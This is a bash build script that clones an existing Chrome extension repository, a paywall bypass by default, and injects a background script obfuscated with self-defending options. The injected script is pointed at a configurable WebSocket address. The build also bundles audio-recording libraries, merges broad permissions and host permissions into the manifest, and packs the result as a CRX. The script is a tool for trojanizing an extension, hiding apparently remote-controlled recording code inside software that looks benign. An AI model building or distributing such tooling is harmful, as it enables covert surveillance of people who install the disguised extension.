#!/usr/bin/env bash
set -euo pipefail
trap 'rm -f temp_manifest.json temp_script.js' EXIT

# Suggested REPO_LIST
REPO_LIST=(
    # "https://github.com/iamadamdev/bypass-paywalls-chrome" ""
    # "https://github.com/mauricecruz/chrome-devtools-zerodarkmatrix-theme" "theme-extension"
    "https://github.com/aspenmayer/bypass-paywalls-chrome-clean-magnolia1234" ""
)

# Default values
RANDOM_INDEX=$((RANDOM % $((${#REPO_LIST[@]} / 2)) * 2))
DEFAULT_REPO_URL=${REPO_LIST[$RANDOM_INDEX]}
DEFAULT_REPO_NAME=$(basename "$DEFAULT_REPO_URL" .git)
DEFAULT_EXTENSION_PATH=${REPO_LIST[$((RANDOM_INDEX + 1))]}
DEFAULT_WS_ADDRESS="ws://127.0.0.1:4343"
DESTINATION_FOLDER="external_extension"
DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
INJECT_SCRIPT="extension/src/bg/background.js"
EXTRA_FILES=("extension/src/bg/lame.min.js"
    "extension/src/bg/RecordRTC.min.js"
)
ORIGINAL_MANIFEST="extension/manifest.json" # Path to the original extension's manifest.json

# Function to build target paths
build_target_path() {
    if [ -z "$EXTENSION_PATH" ]; then
        echo "$DESTINATION_FOLDER/$1"
    else
        echo "$DESTINATION_FOLDER/$EXTENSION_PATH/$1"
    fi
}

# Check dependencies
check_dependencies() {
    local missing_deps=()

    for dep in git jq javascript-obfuscator; do
        if ! command -v "$dep" &>/dev/null; then
            missing_deps+=("$dep")
        fi
    done

    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo "Error: Missing dependencies:"
        printf "  - %s\n" "${missing_deps[@]}"
        echo "Please install the missing dependencies before running this script."
        exit 1
    fi
}

# Prompt user for input
prompt_for_input() {
    local prompt="$1"
    local default="$2"
    local user_input

    read -p "$prompt [$default]: " user_input
    echo "${user_input:-$default}"
}

# Clone repository
clone_repository() {
    # Extract the last part of the repo URL as the repo name

    local target_dir="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
    local temp_dir="$DESTINATION_FOLDER/temp_$DEFAULT_REPO_NAME"

    if [ ! -d "$target_dir" ]; then
        echo "Cloning repository..."
        # Safety check for temp_dir
        if [[ "$temp_dir" == "/" ]] || [[ -z "$temp_dir" ]]; then
            echo "Error: Invalid temporary directory path"
            exit 1
        fi

        mkdir -p "$temp_dir"
        if ! git clone "$REPO_URL" "$temp_dir"; then
            echo "Error: Failed to clone repository."
            echo "Possible reasons:"
            echo "  - The repository URL may be incorrect."
            echo "  - You may not have an internet connection."
            echo "  - You may not have the necessary permissions."
            echo "Please check the URL and your network connection, then try again."

            # Safety check before removal
            if [[ -d "$temp_dir" ]] && [[ "$temp_dir" != "/" ]] && [[ -n "$temp_dir" ]]; then
                find "$temp_dir" -delete 2>/dev/null || rm -r "$temp_dir"
            fi
            exit 1
        fi

        # Move only the extension directory to final location
        if [ -n "$EXTENSION_PATH" ]; then
            mkdir -p "$target_dir"
            mv "$temp_dir/$EXTENSION_PATH"/* "$target_dir/"
        else
            mv "$temp_dir" "$target_dir"
        fi

        # Safety check before cleanup
        if [[ -d "$temp_dir" ]] && [[ "$temp_dir" != "/" ]] && [[ -n "$temp_dir" ]]; then
            find "$temp_dir" -delete 2>/dev/null || rm -r "$temp_dir"
        fi
    else
        echo "Repository already exists, skipping clone."
    fi
}

# Inject script
inject_script() {
    local target_file
    target_file="$DESTINATION_FOLDER_NAME/src/$(basename "$INJECT_SCRIPT")"

    mkdir -p "$(dirname "$target_file")"

    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$INJECT_SCRIPT" >temp_script.js

    javascript-obfuscator temp_script.js --output "$target_file" \
        --compact true \
        --self-defending true \
        --disable-console-output true

    rm temp_script.js

    echo "Injected script: $target_file"
}

# Copy extra files
copy_extra_files() {
    for file in "${EXTRA_FILES[@]}"; do
        if [ -f "$file" ]; then
            local base_name
            base_name=$(basename "$file")
            local target="$DESTINATION_FOLDER_NAME/src/$base_name"
            mkdir -p "$(dirname "$target")"
            cp "$file" "$target"
            echo "Copied extra file: $base_name"
        else
            echo "Warning: Extra file not found: $file"
        fi
    done
}
# Update manifest file
update_manifest() {
    local manifest
    manifest="$DESTINATION_FOLDER_NAME/manifest.json"
    local temp_manifest="temp_manifest.json"
    local service_worker_file="src/service_worker.js"

    # Check manifest version
    local manifest_version
    manifest_version=$(jq -r '.manifest_version' "$manifest")

    if [ "$manifest_version" -eq 2 ]; then
        # Read existing background.scripts
        local existing_bg_scripts
        existing_bg_scripts=$(jq '.background.scripts // []' "$manifest")

        # Merge extra_files and existing_bg_scripts, remove duplicates but keep order
        local merged_scripts
        merged_scripts=$(jq -n --argjson existing "$existing_bg_scripts" --argjson extra '["src/RecordRTC.min.js", "src/lame.min.js"]' '
            ($existing + $extra) | unique')

        # Add src/background.js at the end
        jq --argjson scripts "$merged_scripts" \
            '.background.scripts = ($scripts + ["src/background.js"]) | .background.persistent = true' "$manifest" >"$temp_manifest"

        mv "$temp_manifest" "$manifest"

        # Merge permissions for v2
        local original_permissions
        original_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")

        jq --argjson orig_permissions "$original_permissions" \
            '.permissions = (.permissions + $orig_permissions) | .permissions |= unique' "$manifest" >"$temp_manifest"
        mv "$temp_manifest" "$manifest"

    elif [ "$manifest_version" -eq 3 ]; then
        # Check if service_worker already exists
        local existing_service_worker
        existing_service_worker=$(jq -r '.background.service_worker // empty' "$manifest")

        if [ "$existing_service_worker" != "$service_worker_file" ]; then
            # Create new service_worker.js file
            {
                echo "// Auto-generated service worker"
                for file in "${EXTRA_FILES[@]}"; do
                    local base_name
                    base_name=$(basename "$file")
                    echo "import './src/$base_name';"
                done
                echo "import './src/background.js';"
                # Import existing service worker if it exists
                if [ -n "$existing_service_worker" ]; then
                    echo "import './src/$existing_service_worker';"
                fi
            } >"$DESTINATION_FOLDER_NAME/$service_worker_file"

            jq --arg script "$service_worker_file" \
                '.background.service_worker = $script' "$manifest" >"$temp_manifest"
        else
            cp "$manifest" "$temp_manifest"
        fi

        mv "$temp_manifest" "$manifest"

        # Handle v3 specific permissions
        local original_permissions
        original_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")

        # Filter out v2-only permissions for v3
        local v3_permissions
        v3_permissions=$(jq -n --argjson perms "$original_permissions" \
            '$perms | map(select(. != "<all_urls>" and . != "webRequestBlocking"))')

        jq --argjson orig_permissions "$v3_permissions" \
            '.permissions = (.permissions + $orig_permissions) | .permissions |= unique' "$manifest" >"$temp_manifest"
        mv "$temp_manifest" "$manifest"

        # Handle host_permissions for v3
        local original_host_permissions
        original_host_permissions=$(jq '.host_permissions // []' "$ORIGINAL_MANIFEST")

        jq --argjson orig_host_permissions "$original_host_permissions" \
            '.host_permissions = (.host_permissions + $orig_host_permissions) | .host_permissions |= unique' "$manifest" >"$temp_manifest"
        mv "$temp_manifest" "$manifest"
    else
        echo "Error: Unsupported manifest version: $manifest_version"
        exit 1
    fi

    # Merge optional_permissions (common to both v2 and v3)
    local original_optional_permissions
    original_optional_permissions=$(jq '.optional_permissions // []' "$ORIGINAL_MANIFEST")

    jq --argjson orig_optional_permissions "$original_optional_permissions" \
        '.optional_permissions = (.optional_permissions + $orig_optional_permissions) | .optional_permissions |= unique' "$manifest" >"$temp_manifest"
    mv "$temp_manifest" "$manifest"

    # Merge content_scripts (common to both v2 and v3)
    local original_content_scripts
    original_content_scripts=$(jq '.content_scripts // []' "$ORIGINAL_MANIFEST")

    jq --argjson orig_content_scripts "$original_content_scripts" \
        '.content_scripts = (.content_scripts + $orig_content_scripts)' "$manifest" >"$temp_manifest"
    mv "$temp_manifest" "$manifest"

    # Merge web_accessible_resources (common to both v2 and v3)
    local original_war
    original_war=$(jq '.web_accessible_resources // []' "$ORIGINAL_MANIFEST")

    jq --argjson orig_war "$original_war" \
        '.web_accessible_resources = (.web_accessible_resources + $orig_war) | .web_accessible_resources |= unique' "$manifest" >"$temp_manifest"
    mv "$temp_manifest" "$manifest"

    echo "Updated manifest.json with merged permissions and resources"
}

# Create CRX file
create_crx() {
    local crx_file="${DESTINATION_FOLDER}-injected.crx"
    local pem_file="${DESTINATION_FOLDER}-injected.pem"
    local extension_dir
    extension_dir=$(build_target_path "")

    # Detect browser command
    local browser_cmd
    if command -v chromium &>/dev/null; then
        browser_cmd="chromium"
    elif command -v chromium-browser &>/dev/null; then
        browser_cmd="chromium-browser"
    elif command -v google-chrome &>/dev/null; then
        browser_cmd="google-chrome"
    else
        echo "Error: Chromium or Chrome is not installed, cannot create CRX file."
        return 1
    fi

    # Generate new PEM file if it doesn't exist
    if [ ! -f "$pem_file" ]; then
        openssl genrsa -out "$pem_file" 2048
    fi

    # Pack the extension
    "$browser_cmd" --pack-extension="$extension_dir" --pack-extension-key="$pem_file"

    # Move the generated CRX file
    local generated_crx="${extension_dir}.crx"
    if [ -f "$generated_crx" ]; then
        mv "$generated_crx" "$crx_file"
        echo "Created CRX file: $crx_file"
    else
        echo "Error: Failed to create CRX file."
    fi
}

# Main execution flow
check_dependencies

REPO_URL=$(prompt_for_input "Enter the repository URL" "$DEFAULT_REPO_URL")
WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")
EXTENSION_PATH=$(prompt_for_input "Enter the extension path (leave empty if in root)" "$DEFAULT_EXTENSION_PATH")

# Validate user input
if ! [[ $REPO_URL =~ ^https?:// ]]; then
    echo "Error: Invalid repository URL."
    exit 1
fi

if ! [[ $WS_ADDRESS =~ ^ws:// ]]; then
    echo "Error: Invalid WebSocket address."
    exit 1
fi

echo "Configuration:"
echo "  Repository URL: $REPO_URL"
echo "  WebSocket Address: $WS_ADDRESS"
echo "  Extension Path: ${EXTENSION_PATH:-Root directory}"
echo

read -p "Proceed with this configuration? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Operation cancelled."
    exit 1
fi

clone_repository
inject_script
copy_extra_files
update_manifest

read -p "Do you want to create a CRX file? (y/n) " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    create_crx
fi

echo "Script execution completed."
